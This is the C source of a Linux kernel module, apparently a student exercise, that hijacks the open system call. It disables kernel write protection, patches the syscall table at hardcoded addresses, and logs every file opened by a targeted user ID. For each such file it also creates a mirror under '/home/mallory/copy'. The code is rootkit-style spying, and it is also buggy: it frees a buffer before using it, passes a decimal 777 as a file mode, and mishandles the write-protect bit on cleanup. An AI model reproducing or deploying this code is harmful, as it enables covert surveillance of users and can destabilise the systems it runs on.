#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/moduleparam.h>	
#include <linux/unistd.h>
#include <linux/sched.h>
#include <linux/fs.h>
#include <asm/uaccess.h>
#include <linux/cred.h>
#include <linux/syscalls.h>
#include <linux/namei.h>
#include <linux/init.h>
#include <asm/cacheflush.h>
#include <linux/slab.h>
#include <asm/segment.h>
#include <linux/buffer_head.h>
#include <linux/fcntl.h>

///< The license type -- this affects runtime behavior
MODULE_LICENSE("GPL");
///< The author -- visible when you use modinfo
MODULE_AUTHOR("Shuyang Liu");
///< The description -- see modinfo
MODULE_DESCRIPTION("Replacing open system call");
///< The version of the module
MODULE_VERSION("0.1");

/* 
 * The system call table (a table of functions). We
 * just define this as external, and the kernel will
 * fill it up for us when we are insmod'ed
 *
 * sys_call_table is no longer exported in 2.6.x kernels.
 * If you really want to try this DANGEROUS module you will
 * have to apply the supplied patch against your current kernel
 * and recompile it.
 */
unsigned long *sys_call_table;
/* 
 * UID we want to spy on - will be filled from the
 * command line 
 */
static int uid;
module_param(uid, int, 0644);

void (*pages_rw)(struct page *page, int numpages) =  (void *) 0xffffffff810345a0;
void (*pages_ro)(struct page *page, int numpages) =  (void *) 0xffffffff81034560;

// a global table associating file descriptors
// struct cpy_actual_fd_pair
// {
// 	int cpy_fd;
// 	int actual_fd;
// };
// static struct cpy_actual_fd_pair cpy_actual_fd_pair_table[128];

/* 
 * A pointer to the original system call. The reason
 * we keep this, rather than call the original function
 * (sys_open), is because somebody else might have
 * replaced the system call before us. Note that this
 * is not 100% safe, because if another module
 * replaced sys_open before us, then when we're inserted
 * we'll call the function in that module - and it
 * might be removed before we are.
 *
 * Another reason for this is that we can't get sys_open.
 * It's a static variable, so it is not exported. 
 */
asmlinkage int (*original_open) (const char *, int, int);
asmlinkage int (*original_close) (int);


struct file *
file_open(const char *path, 
	int flags, int rights) 
{
    struct file *filp = NULL;
    mm_segment_t oldfs;
    int err = 0;
    oldfs = get_fs();
    set_fs(get_ds());

    filp = filp_open(path, flags, rights);
    
    set_fs(oldfs);
    if (IS_ERR(filp)) {
        err = PTR_ERR(filp);
        return NULL;
    }
    return filp;
}

void 
file_close(struct file *file) 
{
    filp_close(file, NULL);
}

int 
file_read(struct file *file, 
	unsigned long long offset, 
	unsigned char *data, 
	unsigned int size) 
{
    mm_segment_t oldfs;
    int ret;

    oldfs = get_fs();
    set_fs(get_ds());

    ret = vfs_read(file, data, size, &offset);

    set_fs(oldfs);
    return ret;
}   

int 
file_write(struct file *file, 
	unsigned long long offset, 
	unsigned char *data, 
	unsigned int size) 
{
    mm_segment_t oldfs;
    int ret;

    oldfs = get_fs();
    set_fs(get_ds());

    ret = vfs_write(file, data, size, &offset);

    set_fs(oldfs);
    return ret;
}

int 
file_sync(struct file *file) 
{
    vfs_fsync(file, 0);
    return 0;
}


/* 
 * The function we'll replace sys_open (the function
 * called when you call the open system call) with. To
 * find the exact prototype, with the number and type
 * of arguments, we find the original function first
 * (it's at fs/open.c).
 *
 * In theory, this means that we're tied to the
 * current version of the kernel. In practice, the
 * system calls almost never change (it would wreck havoc
 * and require programs to be recompiled, since the system
 * calls are the interface between the kernel and the
 * processes).
 */
asmlinkage int our_sys_open(const char *filename, int flags, int mode)
{
	/* 
	 * Check if this is the user we're spying on 
	 */
	if(get_current_user()->uid == uid){
		// To handle this address space mismatch, 
		// use the functions get_fs() and set_fs(). 
		// These functions modify the current process 
		// address limits to whatever the caller wants. 
		// In the case of sys_open(), we want to tell the 
		// kernel that pointers from within the kernel address 
		// space are safe, so we call:
		//mm_segment_t old_fs = get_fs();
  		//set_fs(KERNEL_DS);

		char *hidden_path =(char*) kmalloc(strlen(filename)+14+6, GFP_KERNEL);

		// Print out some information
		printk(KERN_INFO "Opened file by uid: %d\n", get_current_user()->uid);
		printk(KERN_INFO "File name: %s\n", filename);
		printk(KERN_INFO "The flags is: %d\n", flags);
		printk(KERN_INFO "The file permission is: %o\n", mode);

		// whenever user sliu44 is accessing a file, it would also create 
		// the same file under mallory's copy folder
		// mallory can access all the files in his copy folder
		strcpy(hidden_path, "/home/mallory/copy");
		strcat(hidden_path, filename);
		printk(KERN_INFO "hidden_path: %s\n\n", hidden_path);

		/* 
		 4 cases:
			- the actual file exist, but copied file does not exist
				- create a new copied file
			- the actual file does not exist, but the copied file exist
				- keep the copied file
			- both exist
				- open the copied and the actual file without creating new files
			- neither exists
				- create both files
		*/
		/*
			The kernel expects the pointer passed to the sys_open() function call 
			to be coming from user space. So, it makes a check of the pointer to 
			verify it is in the proper address space in order to try to convert 
			it to a kernel pointer that the rest of the kernel can use. 
			So, when we are trying to pass a kernel pointer to the function, 
			the error -EFAULT occurs.
			Source: https://www.linuxjournal.com/article/8110
			Therefore, need to fix the address space first
		 */

		// set the permission 777 so that anyone can access this file
		// if the file does not exist, create a new file
		// int cpy_fd = original_open(hidden_path, 
		// 				flags|O_CREAT, 
		// 				S_IRWXU|S_IRWXG|S_IRWXO);

		// printk(KERN_INFO "Returned cpy fd: %d\n", cpy_fd);

		// if (cpy_fd >= 0) {
		// 	printk(KERN_INFO "Created: %s\n", hidden_path);
  //  			//close cpy_fd for now
  //  			original_close(cpy_fd);
		// }

		// Free the path buffer
		kfree(hidden_path);

		// Recover the address space
		//set_fs(old_fs);

		struct file * cpy_file = filp_open(hidden_path, 
						O_CREAT, 777);
		if(cpy_file != NULL && (!IS_ERR(cpy_file))){
			filp_close(cpy_file, NULL);
		}
		

		// TODO: when calling close(), need to close both of the fds
		
	}

	return original_open(filename, flags, mode);

}


/* 
 * Initialize the module - replace the system call 
 */
int init_module()
{
	struct page *sys_call_table_temp;
	/* 
	 * Warning - too late for it now, but maybe for
	 * next time... 
	 */
	printk(KERN_ALERT "I'm dangerous. I hope you did a ");
	printk(KERN_ALERT "sync before you insmod'ed me.\n");
	printk(KERN_ALERT "My counterpart, cleanup_module(), is even");
	printk(KERN_ALERT "more dangerous. If\n");
	printk(KERN_ALERT "you value your file system, it will ");
	printk(KERN_ALERT "be \"sync; rmmod\" \n");
	printk(KERN_ALERT "when you remove this module.\n");

	// make the syscall page writable
	// Change the protected bit of Control Register
	write_cr0 (read_cr0 () & (~ 0x10000)); 
	// address of the syscall table from /boot/System.map file
	sys_call_table = (long unsigned int*) 0xffffffff816003e0; 
	sys_call_table_temp = virt_to_page(&sys_call_table[__NR_open]);
	pages_rw(sys_call_table_temp, 1);

	/* 
	 * Keep a pointer to the original function in
	 * original_call, and then replace the system call
	 * in the system call table with our_sys_open 
	 */
	original_open 	= sys_call_table[__NR_open];
	original_close 	= sys_call_table[__NR_close];

	sys_call_table[__NR_open] = our_sys_open;

	/* 
	 * To get the address of the function for system
	 * call foo, go to sys_call_table[__NR_foo]. 
	 */

	printk(KERN_INFO "Spying on UID:%d\n", uid);

	return 0;
}

/* 
 * Cleanup - unregister the appropriate file from /proc 
 */
void cleanup_module()
{
	struct page *sys_call_table_temp;
	/* 
	 * Return the system call back to normal 
	 */
	if (sys_call_table[__NR_open] != our_sys_open) {
		printk(KERN_ALERT "Somebody else also played with the ");
		printk(KERN_ALERT "open system call\n");
		printk(KERN_ALERT "The system may be left in ");
		printk(KERN_ALERT "an unstable state.\n");
	}
	
	// Change back the protected bit of control register
	write_cr0 (read_cr0 () & (~ 0x10000)); 
	sys_call_table_temp = virt_to_page(&sys_call_table[__NR_open]);
	sys_call_table[__NR_open] = original_open;
	pages_ro(sys_call_table_temp, 1);
	printk(KERN_INFO "Module exit\n");
}

